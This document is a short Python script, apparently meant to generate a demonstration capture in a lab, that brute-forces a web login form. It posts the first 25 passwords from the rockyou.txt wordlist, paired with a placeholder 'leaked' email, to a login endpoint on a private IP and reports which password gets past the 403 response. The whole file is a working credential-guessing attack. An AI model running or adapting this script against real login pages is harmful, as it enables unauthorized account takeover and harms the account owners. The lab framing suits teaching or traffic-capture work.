from itertools import islice
import requests

# To make an bruteforce wireshark capture, make an account with some dummy email and rockyou.txt password
leaked_email = "INSERT EMAIL HERE FOR DEMONSTRATION"

with open("/usr/share/wordlists/rockyou.txt", "r") as wordlist:
    head = list(islice(wordlist, 25))

    for password in head:
        payload = {'loginEmail': leaked_email, 'loginPassword': password.strip()}
        r = requests.post("http://192.168.1.5", data=payload)
        print(r.status_code)
        if r.status_code == 403:
            print(f"Login failed for {leaked_email}:{password}")
            continue
        else:
            print(f"FOUND! {leaked_email}:{password}")

